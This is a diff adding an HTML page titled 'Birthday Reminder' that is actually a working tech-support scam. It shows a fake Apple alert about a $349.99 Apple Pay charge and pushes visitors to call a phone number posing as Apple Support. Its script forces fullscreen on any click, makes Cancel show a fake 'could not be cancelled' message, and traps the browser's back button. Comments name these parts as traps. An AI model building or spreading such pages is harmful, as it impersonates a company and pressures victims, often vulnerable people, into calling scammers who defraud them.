@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Birthday Reminder</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", sans-serif;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            width: 100vw;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #000;
+            /* Prevents pulling down to refresh on mobile */
+            overscroll-behavior-y: contain; 
+        }
+
+        .background-img {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('BACK1.png'); 
+            background-size: cover; 
+            background-position: center;
+            filter: brightness(0.8); 
+            z-index: 1;
+        }
+        
+        .alert-box {
+            position: relative;
+            z-index: 10;
+            width: 270px;
+            background-color: rgba(40, 40, 40, 0.75);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            border-radius: 14px;
+            text-align: center;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
+            color: white;
+            overflow: hidden;
+        }
+
+        .alert-content {
+            padding: 20px;
+        }
+
+        .alert-title {
+            font-weight: 600;
+            font-size: 17px;
+            margin-bottom: 4px;
+        }
+
+        .alert-message {
+            font-size: 13px;
+            line-height: 1.4;
+        }
+
+        .button-group {
+            display: flex;
+            border-top: 0.5px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .alert-button {
+            flex: 1;
+            padding: 12px 0;
+            font-size: 17px;
+            color: #0a84ff;
+            text-decoration: none;
+            text-align: center;
+            cursor: pointer;
+            background: transparent;
+            border: none;
+            outline: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .btn-cancel {
+            font-weight: 400;
+            border-right: 0.5px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .btn-call {
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body onclick="goFullScreen()">
+
+    <div class="background-img"></div>
+
+    <div class="alert-box">
+        <div class="alert-content">
+            <div class="alert-title">Contact Apple Support</div>
+            <div class="alert-message">Your iphone Apple ID was Recently Used at APPLE STORE for $349.99 via Apple Pay for cancelling the order Contact Apple Support.</div>
+        </div>
+        
+        <div class="button-group">
+            <button class="alert-button btn-cancel" onclick="doNothing(event)">Cancel</button>
+            
+            <a href="tel:+18668022352" class="alert-button btn-call">Call</a>
+        </div>
+    </div>
+
+    <script>
+        // 1. Force Fullscreen on first click
+        function goFullScreen() {
+            let elem = document.documentElement;  
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen();
+            } else if (elem.webkitRequestFullscreen) { /* Safari */
+                elem.webkitRequestFullscreen();
+            } else if (elem.msRequestFullscreen) { /* IE11 */
+                elem.msRequestFullscreen();
+            }
+        }
+
+        // 2. The Cancel Trap
+        function doNothing(event) {
+            event.stopPropagation(); // Prevents clicking "Cancel" from triggering Fullscreen again
+            alert("Action could not be cancelled. Please proceed.");
+        }
+
+        // 3. The Back Button Trap (Techie Counter-measure)
+        // This adds a fake entry to history so hitting "back" just keeps them here
+        history.pushState(null, null, location.href);
+        window.onpopstate = function () {
+            history.go(1);
+        };
+    </script>
+
+</body>
+</html>
